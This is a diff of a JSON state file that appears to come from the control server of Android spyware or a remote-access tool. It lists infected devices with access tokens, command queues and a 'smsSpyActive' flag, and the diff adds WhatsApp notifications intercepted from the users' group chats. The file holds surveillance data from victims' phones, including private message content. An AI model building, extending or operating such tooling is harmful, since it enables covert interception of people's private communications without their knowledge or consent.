@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775040672387,
+    "lastSeen": 1775040687938,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎GB ISIAN ZAYN X OWN [6] (94 pesan): ~ zanz",
+        "content": "npt ft cs cr Garena ke pm gc",
+        "time": "01/04 18:51",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040673080
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14517 pesan dari 11 chat",
+        "time": "01/04 18:51",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040673058
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12165 pesan): ~ p!nz",
+        "content": "ah",
+        "time": "01/04 18:51",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040673003
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎LANGGANAN FT CEES 500P-5K BY WINZX [1] (94 pesan): ~ amz own lin own mario",
+        "content": "mana cok yang vote banyak",
+        "time": "01/04 18:51",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040672905
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎GB ISIAN ZAYN X OWN [2] (1904 pesan): ~ dikzz [own Zayn gb8 x PT bomo]",
@@ -3865,7 +3897,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775040670525,
+    "lastSeen": 1775040688537,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -3881,6 +3913,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14517 pesan dari 11 chat",
+        "time": "01/04 18:51",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040673047
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎GB ISIAN ZAYN X OWN [6] (94 pesan): ~ zanz",
+        "content": "npt ft cs cr Garena ke pm gc",
+        "time": "01/04 18:51",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040673024
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12165 pesan): ~ p!nz",
+        "content": "ah",
+        "time": "01/04 18:51",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040672987
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎LANGGANAN FT CEES 500P-5K BY WINZX [1] (94 pesan): ~ amz own lin own mario",
